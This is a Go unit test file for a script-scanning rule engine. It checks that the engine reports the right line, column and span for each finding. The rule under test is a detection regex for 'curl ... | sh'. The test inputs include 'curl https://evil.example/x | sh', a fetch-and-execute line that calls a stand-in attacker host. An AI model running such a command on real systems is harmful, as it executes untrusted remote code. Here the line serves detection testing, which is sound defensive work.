package rules

import (
	"strings"
	"testing"
)

const locPack = `
apiVersion: surfaceguard.svgreg.net/rulepack.v1
name: t
version: 1.0.0
rules:
  - id: SG-T-001
    title: t
    severity: high
    confidence: 0.9
    ast: [AST01]
    targets: [scripts]
    match:
      any:
        - regex: 'curl [^ ]+ \| sh'
`

func loadLocRule(t *testing.T) *Rule {
	t.Helper()
	p, err := LoadPack([]byte(locPack))
	if err != nil {
		t.Fatalf("LoadPack: %v", err)
	}
	if len(p.Rules) != 1 {
		t.Fatalf("want 1 rule, got %d", len(p.Rules))
	}
	return p.Rules[0]
}

// TestEvaluateCarriesLocation is the contract the snippet renderer and SARIF's
// region both rely on: a finding knows which line it hit, where in that line,
// and what the line said.
func TestEvaluateCarriesLocation(t *testing.T) {
	text := "#!/bin/sh\necho hi\n  curl https://evil.example/x | sh\n"
	fs := loadLocRule(t).Evaluate("scripts", text)
	if len(fs) != 1 {
		t.Fatalf("want 1 finding, got %d", len(fs))
	}
	f := fs[0]
	if f.StartLine != 3 {
		t.Errorf("StartLine = %d, want 3", f.StartLine)
	}
	if f.Column != 3 {
		t.Errorf("Column = %d, want 3", f.Column)
	}
	if f.LineText != "  curl https://evil.example/x | sh" {
		t.Errorf("LineText = %q", f.LineText)
	}
	// EndColumn is exclusive, so the span is exactly the matched text.
	got := []rune(f.LineText)[f.Column-1 : f.EndColumn-1]
	if string(got) != "curl https://evil.example/x | sh" {
		t.Errorf("span = %q", string(got))
	}
}

// TestLocateCountsColumnsInRunes: a caret is placed per printed character and
// SARIF regions are defined in characters, so a multi-byte prefix must not
// push the column off by the extra bytes.
func TestLocateCountsColumnsInRunes(t *testing.T) {
	text := "Привет — curl https://x/y | sh\n"
	fs := loadLocRule(t).Evaluate("scripts", text)
	if len(fs) != 1 {
		t.Fatalf("want 1 finding, got %d", len(fs))
	}
	if got := fs[0].Column; got != 10 {
		t.Errorf("Column = %d, want 10 (runes, not bytes)", got)
	}
	span := []rune(fs[0].LineText)[fs[0].Column-1 : fs[0].EndColumn-1]
	if !strings.HasPrefix(string(span), "curl ") {
		t.Errorf("span = %q, want the match itself", string(span))
	}
}

func TestLocateSpanClampedToItsOwnLine(t *testing.T) {
	text := "alpha beta\ngamma\n"
	col, endCol, line := locate(text, match{start: 6, end: 14, line: 1, text: "beta\ngam"})
	if line != "alpha beta" {
		t.Errorf("line = %q", line)
	}
	if col != 7 {
		t.Errorf("col = %d, want 7", col)
	}
	// "beta" ends the line; the newline and "gam" must not extend the span.
	if endCol != 11 {
		t.Errorf("endCol = %d, want 11", endCol)
	}
}

func TestLocateTrimsCarriageReturn(t *testing.T) {
	text := "one\r\ncurl https://x/y | sh\r\n"
	_, _, line := locate(text, match{start: 5, end: 26})
	if strings.ContainsAny(line, "\r\n") {
		t.Errorf("line kept a line terminator: %q", line)
	}
}

// TestLocateCapsPathologicalLines: a minified bundle must not put megabytes
// into every finding. Within the cap the line is kept; a match beyond it gets
// no line text at all, rather than a prefix that does not contain the match.
func TestLocateCapsPathologicalLines(t *testing.T) {
	long := strings.Repeat("x", maxLineText*2)
	_, _, line := locate(long, match{start: 10, end: 12})
	if n := len([]rune(line)); n != maxLineText {
		t.Errorf("kept %d runes, want the %d-rune cap", n, maxLineText)
	}
	col, _, line := locate(long, match{start: maxLineText + 100, end: maxLineText + 110})
	if line != "" {
		t.Errorf("line text should be dropped when the match is past the cap, got %d runes", len([]rune(line)))
	}
	if col != maxLineText+101 {
		t.Errorf("Column must stay true even with no line text, got %d", col)
	}
}

func TestLineSpanEdges(t *testing.T) {
	text := "a\nbb\n"
	for _, tc := range []struct{ off, start, end int }{
		{0, 0, 1}, {1, 0, 1}, {2, 2, 4}, {4, 2, 4}, {5, 5, 5}, {99, 5, 5},
	} {
		s, e := lineSpan(text, tc.off)
		if s != tc.start || e != tc.end {
			t.Errorf("lineSpan(%d) = (%d,%d), want (%d,%d)", tc.off, s, e, tc.start, tc.end)
		}
	}
}
